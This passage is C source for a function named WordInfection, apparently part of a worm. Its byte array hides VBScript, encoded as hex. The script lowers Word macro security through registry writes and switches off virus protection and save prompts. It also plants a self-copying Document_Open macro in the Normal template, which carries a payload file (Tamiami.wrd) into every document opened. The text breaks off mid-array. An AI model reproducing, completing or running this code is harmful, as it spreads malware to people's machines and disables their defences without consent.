bool WordInfection(void)
{
	unsigned char InsertVBS[3422] =
	{
		0x4F, 0x6E, 0x20, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x20, 0x52, 0x65, 0x73, 0x75, 0x6D, 0x65, 0x20, 
		0x4E, 0x65, 0x78, 0x74, 0x0D, 0x0A, 0x53, 0x65, 0x74, 0x20, 0x57, 0x6F, 0x72, 0x64, 0x20, 0x3D, 
		0x20, 0x57, 0x53, 0x63, 0x72, 0x69, 0x70, 0x74, 0x2E, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x4F, 
		0x62, 0x6A, 0x65, 0x63, 0x74, 0x28, 0x22, 0x57, 0x6F, 0x72, 0x64, 0x2E, 0x41, 0x70, 0x70, 0x6C, 
		0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x22, 0x29, 0x0D, 0x0A, 0x53, 0x65, 0x74, 0x20, 0x53, 
		0x68, 0x65, 0x6C, 0x6C, 0x20, 0x3D, 0x20, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x4F, 0x62, 0x6A, 
		0x65, 0x63, 0x74, 0x28, 0x22, 0x57, 0x53, 0x63, 0x72, 0x69, 0x70, 0x74, 0x2E, 0x53, 0x68, 0x65, 
		0x6C, 0x6C, 0x22, 0x29, 0x0D, 0x0A, 0x53, 0x65, 0x74, 0x20, 0x4E, 0x20, 0x3D, 0x20, 0x57, 0x6F, 
		0x72, 0x64, 0x2E, 0x4E, 0x6F, 0x72, 0x6D, 0x61, 0x6C, 0x54, 0x65, 0x6D, 0x70, 0x6C, 0x61, 0x74, 
		0x65, 0x2E, 0x56, 0x42, 0x50, 0x72, 0x6F, 0x6A, 0x65, 0x63, 0x74, 0x2E, 0x56, 0x42, 0x43, 0x6F, 
		0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x73, 0x28, 0x31, 0x29, 0x2E, 0x43, 0x6F, 0x64, 0x65, 
		0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x0D, 0x0A, 0x52, 0x65, 0x67, 0x50, 0x61, 0x74, 0x68, 0x20, 
		0x3D, 0x20, 0x22, 0x48, 0x4B, 0x43, 0x55, 0x5C, 0x53, 0x6F, 0x66, 0x74, 0x77, 0x61, 0x72, 0x65, 
		0x5C, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x5C, 0x4F, 0x66, 0x66, 0x69, 0x63, 
		0x65, 0x5C, 0x22, 0x20, 0x26, 0x20, 0x57, 0x6F, 0x72, 0x64, 0x2E, 0x41, 0x70, 0x70, 0x6C, 0x69, 
		0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x2E, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x20, 0x26, 
		0x20, 0x22, 0x5C, 0x57, 0x6F, 0x72, 0x64, 0x5C, 0x53, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 
		0x5C, 0x22, 0x0D, 0x0A, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x2E, 0x52, 0x65, 0x67, 0x57, 0x72, 0x69, 
		0x74, 0x65, 0x20, 0x52, 0x65, 0x67, 0x50, 0x61, 0x74, 0x68, 0x20, 0x26, 0x20, 0x22, 0x4C, 0x65, 
		0x76, 0x65, 0x6C, 0x22, 0x2C, 0x20, 0x31, 0x2C, 0x20, 0x22, 0x52, 0x45, 0x47, 0x5F, 0x44, 0x57, 
		0x4F, 0x52, 0x44, 0x22, 0x0D, 0x0A, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x2E, 0x52, 0x65, 0x67, 0x57, 
		0x72, 0x69, 0x74, 0x65, 0x20, 0x52, 0x65, 0x67, 0x50, 0x61, 0x74, 0x68, 0x20, 0x26, 0x20, 0x22, 
		0x41, 0x63, 0x63, 0x65, 0x73, 0x73, 0x56, 0x42, 0x4F, 0x4D, 0x22, 0x2C, 0x20, 0x31, 0x2C, 0x20, 
		0x22, 0x52, 0x45, 0x47, 0x5F, 0x44, 0x57, 0x4F, 0x52, 0x44, 0x22, 0x0D, 0x0A, 0x57, 0x6F, 0x72, 
		0x64, 0x2E, 0x4F, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x2E, 0x56, 0x69, 0x72, 0x75, 0x73, 0x50, 
		0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x3D, 0x20, 0x46, 0x61, 0x6C, 0x73, 
		0x65, 0x0D, 0x0A, 0x57, 0x6F, 0x72, 0x64, 0x2E, 0x4F, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x2E, 
		0x43, 0x6F, 0x6E, 0x66, 0x69, 0x72, 0x6D, 0x43, 0x6F, 0x6E, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 
		0x6E, 0x20, 0x3D, 0x20, 0x46, 0x61, 0x6C, 0x73, 0x65, 0x0D, 0x0A, 0x57, 0x6F, 0x72, 0x64, 0x2E, 
		0x4F, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x2E, 0x53, 0x61, 0x76, 0x65, 0x4E, 0x6F, 0x72, 0x6D, 
		0x61, 0x6C, 0x50, 0x72, 0x6F, 0x6D, 0x70, 0x74, 0x20, 0x3D, 0x20, 0x46, 0x61, 0x6C, 0x73, 0x65, 
		0x0D, 0x0A, 0x4E, 0x2E, 0x44, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 
		0x31, 0x2C, 0x20, 0x4E, 0x2E, 0x43, 0x6F, 0x75, 0x6E, 0x74, 0x4F, 0x66, 0x4C, 0x69, 0x6E, 0x65, 
		0x73, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 
		0x20, 0x31, 0x2C, 0x20, 0x22, 0x50, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x20, 0x53, 0x75, 0x62, 
		0x20, 0x44, 0x6F, 0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x5F, 0x4F, 0x70, 0x65, 0x6E, 0x28, 0x29, 
		0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 
		0x20, 0x32, 0x2C, 0x20, 0x22, 0x4F, 0x6E, 0x20, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x20, 0x52, 0x65, 
		0x73, 0x75, 0x6D, 0x65, 0x20, 0x4E, 0x65, 0x78, 0x74, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 
		0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x33, 0x2C, 0x20, 0x22, 0x44, 0x69, 
		0x6D, 0x20, 0x54, 0x61, 0x6D, 0x69, 0x61, 0x6D, 0x69, 0x20, 0x41, 0x73, 0x20, 0x53, 0x74, 0x72, 
		0x69, 0x6E, 0x67, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 
		0x6E, 0x65, 0x73, 0x20, 0x34, 0x2C, 0x20, 0x22, 0x44, 0x69, 0x6D, 0x20, 0x54, 0x61, 0x6D, 0x31, 
		0x20, 0x41, 0x73, 0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 
		0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x35, 0x2C, 0x20, 0x22, 0x44, 
		0x69, 0x6D, 0x20, 0x54, 0x61, 0x6D, 0x32, 0x20, 0x41, 0x73, 0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 
		0x67, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 
		0x73, 0x20, 0x36, 0x2C, 0x20, 0x22, 0x44, 0x69, 0x6D, 0x20, 0x54, 0x61, 0x6D, 0x33, 0x20, 0x41, 
		0x73, 0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 
		0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x37, 0x2C, 0x20, 0x22, 0x44, 0x69, 0x6D, 
		0x20, 0x54, 0x61, 0x6D, 0x34, 0x20, 0x41, 0x73, 0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x22, 
		0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 
		0x38, 0x2C, 0x20, 0x22, 0x4F, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x2E, 0x56, 0x69, 0x72, 0x75, 
		0x73, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x3D, 0x20, 0x46, 0x61, 
		0x6C, 0x73, 0x65, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 
		0x6E, 0x65, 0x73, 0x20, 0x39, 0x2C, 0x20, 0x22, 0x4F, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x2E, 
		0x53, 0x61, 0x76, 0x65, 0x4E, 0x6F, 0x72, 0x6D, 0x61, 0x6C, 0x50, 0x72, 0x6F, 0x6D, 0x70, 0x74, 
		0x20, 0x3D, 0x20, 0x46, 0x61, 0x6C, 0x73, 0x65, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 
		0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 0x30, 0x2C, 0x20, 0x22, 0x4F, 0x70, 
		0x74, 0x69, 0x6F, 0x6E, 0x73, 0x2E, 0x43, 0x6F, 0x6E, 0x66, 0x69, 0x72, 0x6D, 0x43, 0x6F, 0x6E, 
		0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x73, 0x20, 0x3D, 0x20, 0x46, 0x61, 0x6C, 0x73, 0x65, 
		0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 
		0x20, 0x31, 0x31, 0x2C, 0x20, 0x22, 0x4F, 0x70, 0x65, 0x6E, 0x20, 0x45, 0x6E, 0x76, 0x69, 0x72, 
		0x6F, 0x6E, 0x28, 0x22, 0x22, 0x57, 0x69, 0x6E, 0x44, 0x69, 0x72, 0x22, 0x22, 0x29, 0x20, 0x26, 
		0x20, 0x22, 0x22, 0x5C, 0x54, 0x61, 0x6D, 0x69, 0x61, 0x6D, 0x69, 0x2E, 0x77, 0x72, 0x64, 0x22, 
		0x22, 0x20, 0x46, 0x6F, 0x72, 0x20, 0x42, 0x69, 0x6E, 0x61, 0x72, 0x79, 0x20, 0x41, 0x73, 0x20, 
		0x23, 0x31, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 
		0x65, 0x73, 0x20, 0x31, 0x32, 0x2C, 0x20, 0x22, 0x54, 0x61, 0x6D, 0x69, 0x61, 0x6D, 0x69, 0x20, 
		0x3D, 0x20, 0x53, 0x70, 0x61, 0x63, 0x65, 0x28, 0x4C, 0x4F, 0x46, 0x28, 0x31, 0x29, 0x29, 0x22, 
		0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 
		0x31, 0x33, 0x2C, 0x20, 0x22, 0x47, 0x65, 0x74, 0x20, 0x23, 0x31, 0x2C, 0x20, 0x2C, 0x20, 0x54, 
		0x61, 0x6D, 0x69, 0x61, 0x6D, 0x69, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 
		0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 0x34, 0x2C, 0x20, 0x22, 0x43, 0x6C, 0x6F, 0x73, 
		0x65, 0x20, 0x23, 0x31, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 
		0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 0x35, 0x2C, 0x20, 0x22, 0x54, 0x61, 0x6D, 0x31, 0x20, 0x3D, 
		0x20, 0x4C, 0x65, 0x66, 0x74, 0x28, 0x54, 0x61, 0x6D, 0x69, 0x61, 0x6D, 0x69, 0x2C, 0x20, 0x34, 
		0x39, 0x39, 0x39, 0x39, 0x29, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 
		0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 0x36, 0x2C, 0x20, 0x22, 0x54, 0x61, 0x6D, 0x32, 0x20, 
		0x3D, 0x20, 0x4D, 0x69, 0x64, 0x28, 0x54, 0x61, 0x6D, 0x69, 0x61, 0x6D, 0x69, 0x2C, 0x20, 0x35, 
		0x30, 0x30, 0x30, 0x30, 0x2C, 0x20, 0x34, 0x39, 0x39, 0x39, 0x39, 0x29, 0x22, 0x0D, 0x0A, 0x4E, 
		0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 0x37, 0x2C, 
		0x20, 0x22, 0x54, 0x61, 0x6D, 0x33, 0x20, 0x3D, 0x20, 0x4D, 0x69, 0x64, 0x28, 0x54, 0x61, 0x6D, 
		0x69, 0x61, 0x6D, 0x69, 0x2C, 0x20, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x2C, 0x20, 0x34, 0x39, 
		0x39, 0x39, 0x39, 0x29, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 
		0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 0x38, 0x2C, 0x20, 0x22, 0x54, 0x61, 0x6D, 0x34, 0x20, 0x3D, 
		0x20, 0x52, 0x69, 0x67, 0x68, 0x74, 0x28, 0x54, 0x61, 0x6D, 0x69, 0x61, 0x6D, 0x69, 0x2C, 0x20, 
		0x34, 0x39, 0x39, 0x39, 0x39, 0x29, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 
		0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 0x39, 0x2C, 0x20, 0x22, 0x41, 0x63, 0x74, 0x69, 
		0x76, 0x65, 0x44, 0x6F, 0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x2E, 0x56, 0x61, 0x72, 0x69, 0x61, 
		0x62, 0x6C, 0x65, 0x73, 0x2E, 0x41, 0x64, 0x64, 0x20, 0x22, 0x22, 0x54, 0x61, 0x6D, 0x69, 0x61, 
		0x6D, 0x69, 0x31, 0x22, 0x22, 0x2C, 0x20, 0x54, 0x61, 0x6D, 0x31, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 
		0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x32, 0x30, 0x2C, 0x20, 
		0x22, 0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x44, 0x6F, 0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x2E, 
		0x56, 0x61, 0x72, 0x69, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x2E, 0x41, 0x64, 0x64, 0x20, 0x22, 0x22, 
		0x54, 0x61, 0x6D, 0x69, 0x61, 0x6D, 0x69, 0x32, 0x22, 0x22, 0x2C, 0x20, 0x54, 0x61, 0x6D, 0x32, 
		0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 
		0x20, 0x32, 0x31, 0x2C, 0x20, 0x22, 0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x44, 0x6F, 0x63, 0x75, 
		0x6D, 0x65, 0x6E, 0x74, 0x2E, 0x56, 0x61, 0x72, 0x69, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x2E, 0x41, 
		0x64, 0x64, 0x20, 0x22, 0x22, 0x54, 0x61, 0x6D, 0x69, 0x61, 0x6D, 0x69, 0x33, 0x22, 0x22, 0x2C, 
		0x20, 0x54, 0x61, 0x6D, 0x33, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 
		0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x32, 0x32, 0x2C, 0x20, 0x22, 0x41, 0x63, 0x74, 0x69, 0x76, 
		0x65, 0x44, 0x6F, 0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x2E, 0x56, 0x61, 0x72, 0x69, 0x61, 0x62, 
		0x6C, 0x65, 0x73, 0x2E, 0x41, 0x64, 0x64, 0x20, 0x22, 0x22, 0x54, 0x61, 0x6D, 0x69, 0x61, 0x6D, 
		0x69, 0x34, 0x22, 0x22, 0x2C, 0x20, 0x54, 0x61, 0x6D, 0x34, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 
		0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x32, 0x33, 0x2C, 0x20, 0x22, 
		0x53, 0x65, 0x74, 0x20, 0x41, 0x20, 0x3D, 0x20, 0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x44, 0x6F, 
		0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x2E, 0x56, 0x42, 0x50, 0x72, 0x6F, 0x6A, 0x65, 0x63, 0x74, 
		0x2E, 0x56, 0x42, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x73, 0x28, 0x31, 0x29, 
		0x2E, 0x43, 0x6F, 0x64, 0x65, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 
		0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x32, 0x34, 0x2C, 0x20, 
		0x22, 0x41, 0x2E, 0x44, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 
		0x2C, 0x20, 0x41, 0x2E, 0x43, 0x6F, 0x75, 0x6E, 0x74, 0x4F, 0x66, 0x4C, 0x69, 0x6E, 0x65, 0x73, 
		0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 
		0x20, 0x32, 0x35, 0x2C, 0x20, 0x22, 0x41, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 
		0x6E, 0x65, 0x73, 0x20, 0x31, 0x2C, 0x20, 0x22, 0x22, 0x50, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 
		0x20, 0x53, 0x75, 0x62, 0x20, 0x44, 0x6F, 0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x5F, 0x4F, 0x70, 
		0x65, 0x6E, 0x28, 0x29, 0x22, 0x22, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 
		0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x32, 0x36, 0x2C, 0x20, 0x22, 0x41, 0x2E, 0x49, 0x6E, 
		0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x32, 0x2C, 0x20, 0x22, 0x22, 0x4F, 
		0x6E, 0x20, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x20, 0x52, 0x65, 0x73, 0x75, 0x6D, 0x65, 0x20, 0x4E, 
		0x65, 0x78, 0x74, 0x22, 0x22, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 
		0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x32, 0x37, 0x2C, 0x20, 0x22, 0x41, 0x2E, 0x49, 0x6E, 0x73, 
		0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x33, 0x2C, 0x20, 0x22, 0x22, 0x44, 0x69, 
		0x6D, 0x20, 0x54, 0x61, 0x6D, 0x69, 0x61, 0x6D, 0x69, 0x20, 0x41, 0x73, 0x20, 0x53, 0x74, 0x72, 
		0x69, 0x6E, 0x67, 0x22, 0x22, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 
		0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x32, 0x38, 0x2C, 0x20, 0x22, 0x41, 0x2E, 0x49, 0x6E, 0x73, 
		0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x34, 0x2C, 0x20, 0x22, 0x22, 0x44, 0x69, 
		0x6D, 0x20, 0x54, 0x61, 0x6D, 0x31, 0x20, 0x41, 0x73, 0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 
		0x22, 0x22, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 
		0x65, 0x73, 0x20, 0x32, 0x39, 0x2C, 0x20, 0x22, 0x41, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 
		0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x35, 0x2C, 0x20, 0x22, 0x22, 0x44, 0x69, 0x6D, 0x20, 0x54, 
		0x61, 0x6D, 0x32, 0x20, 0x41, 0x73, 0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x22, 0x22, 0x22, 
		0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 
		0x33, 0x30, 0x2C, 0x20, 0x22, 0x41, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 
		0x65, 0x73, 0x20, 0x36, 0x2C, 0x20, 0x22, 0x22, 0x44, 0x69, 0x6D, 0x20, 0x54, 0x61, 0x6D, 0x33, 
		0x20, 0x41, 0x73, 0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x22, 0x22, 0x22, 0x0D, 0x0A, 0x4E, 
		0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x33, 0x31, 0x2C, 
		0x20, 0x22, 0x41, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 
		0x37, 0x2C, 0x20, 0x22, 0x22, 0x44, 0x69, 0x6D, 0x20, 0x54, 0x61, 0x6D, 0x34, 0x20, 0x41, 0x73, 
		0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x22, 0x22, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 
		0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x33, 0x32, 0x2C, 0x20, 0x22, 0x41, 
		0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x38, 0x2C, 0x20, 
		0x22, 0x22, 0x54, 0x61, 0x6D, 0x31, 0x20, 0x3D, 0x20, 0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x44, 
		0x6F, 0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x2E, 0x56, 0x61, 0x72, 0x69, 0x61, 0x62, 0x6C, 0x65, 
		0x73, 0x28, 0x22, 0x22, 0x22, 0x22, 0x54, 0x61, 0x6D, 0x69, 0x61, 0x6D, 0x69, 0x31, 0x22, 0x22, 
		0x22, 0x22, 0x29, 0x2E, 0x56, 0x61, 0x6C, 0x75, 0x65, 0x22, 0x22, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 
		0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x33, 0x33, 0x2C, 0x20, 
		0x22, 0x41, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x39, 
		0x2C, 0x20, 0x22, 0x22, 0x54, 0x61, 0x6D, 0x32, 0x20, 0x3D, 0x20, 0x41, 0x63, 0x74, 0x69, 0x76, 
		0x65, 0x44, 0x6F, 0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x2E, 0x56, 0x61, 0x72, 0x69, 0x61, 0x62, 
		0x6C, 0x65, 0x73, 0x28, 0x22, 0x22, 0x22, 0x22, 0x54, 0x61, 0x6D, 0x69, 0x61, 0x6D, 0x69, 0x32, 
		0x22, 0x22, 0x22, 0x22, 0x29, 0x2E, 0x56, 0x61, 0x6C, 0x75, 0x65, 0x22, 0x22, 0x22, 0x0D, 0x0A, 
		0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x33, 0x34, 
		0x2C, 0x20, 0x22, 0x41, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 
		0x20, 0x31, 0x30, 0x2C, 0x20, 0x22, 0x22, 0x54, 0x61, 0x6D, 0x33, 0x20, 0x3D, 0x20, 0x41, 0x63, 
		0x74, 0x69, 0x76, 0x65, 0x44, 0x6F, 0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x2E, 0x56, 0x61, 0x72, 
		0x69, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x28, 0x22, 0x22, 0x22, 0x22, 0x54, 0x61, 0x6D, 0x69, 0x61, 
		0x6D, 0x69, 0x33, 0x22, 0x22, 0x22, 0x22, 0x29, 0x2E, 0x56, 0x61, 0x6C, 0x75, 0x65, 0x22, 0x22, 
		0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 
		0x20, 0x33, 0x35, 0x2C, 0x20, 0x22, 0x41, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 
		0x6E, 0x65, 0x73, 0x20, 0x31, 0x31, 0x2C, 0x20, 0x22, 0x22, 0x54, 0x61, 0x6D, 0x34, 0x20, 0x3D, 
		0x20, 0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x44, 0x6F, 0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x2E, 
		0x56, 0x61, 0x72, 0x69, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x28, 0x22, 0x22, 0x22, 0x22, 0x54, 0x61, 
		0x6D, 0x69, 0x61, 0x6D, 0x69, 0x34, 0x22, 0x22, 0x22, 0x22, 0x29, 0x2E, 0x56, 0x61, 0x6C, 0x75, 
		0x65, 0x22, 0x22, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 
		0x6E, 0x65, 0x73, 0x20, 0x33, 0x36, 0x2C, 0x20, 0x22, 0x41, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 
		0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 0x32, 0x2C, 0x20, 0x22, 0x22, 0x54, 0x61, 0x6D, 
		0x69, 0x61, 0x6D, 0x69, 0x20, 0x3D, 0x20, 0x54, 0x61, 0x6D, 0x31, 0x20, 0x2B, 0x20, 0x54, 0x61, 
		0x6D, 0x32, 0x20, 0x2B, 0x20, 0x54, 0x61, 0x6D, 0x33, 0x20, 0x2B, 0x20, 0x54, 0x61, 0x6D, 0x34, 
		0x22, 0x22, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 
		0x65, 0x73, 0x20, 0x33, 0x37, 0x2C, 0x20, 0x22, 0x41, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 
		0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 0x33, 0x2C, 0x20, 0x22, 0x22, 0x4F, 0x70, 0x65, 0x6E, 
